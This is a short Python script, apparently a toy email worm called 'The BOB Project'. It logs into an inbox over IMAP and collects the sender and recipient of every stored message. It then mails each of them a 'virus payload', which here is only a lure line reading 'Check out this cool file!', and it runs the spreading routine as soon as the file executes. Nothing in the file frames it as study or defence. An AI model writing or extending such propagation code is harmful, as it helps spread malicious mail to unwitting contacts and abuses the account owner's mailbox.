t# The "BOB" Project

import smtplib
import imaplib
import email
import os

# Email credentials (replace with your own)
EMAIL_ADDRESS = 'your_email@example.com'
EMAIL_PASSWORD = 'your_email_password'

def send_virus(payload, receiver):
    # Establish a connection to the SMTP server
    with smtplib.SMTP('smtp.example.com', 587) as server:
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        
        # Send the email with the virus payload
        server.sendmail(EMAIL_ADDRESS, receiver, payload)

def infect_contacts():
    # Connect to the IMAP server and select the inbox
    mail = imaplib.IMAP4_SSL('imap.example.com')
    mail.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
    mail.select('inbox')

    # Search for all email messages
    status, data = mail.search(None, 'ALL')
    mail_ids = data[0].split()

    # Iterate through each email and extract the sender and receiver
    for mail_id in mail_ids:
        status, data = mail.fetch(mail_id, '(RFC822)')
        raw_email = data[0][1]
        msg = email.message_from_bytes(raw_email)

        # Extract sender and receiver
        sender = msg['From']
        receiver = msg['To']

        # Send the virus to the sender and receiver
        send_virus("Hey there! Check out this cool file!", sender)
        send_virus("Hey there! Check out this cool file!", receiver)

    # Close the connection
    mail.logout()

# Call the function to infect contacts
infect_contacts()
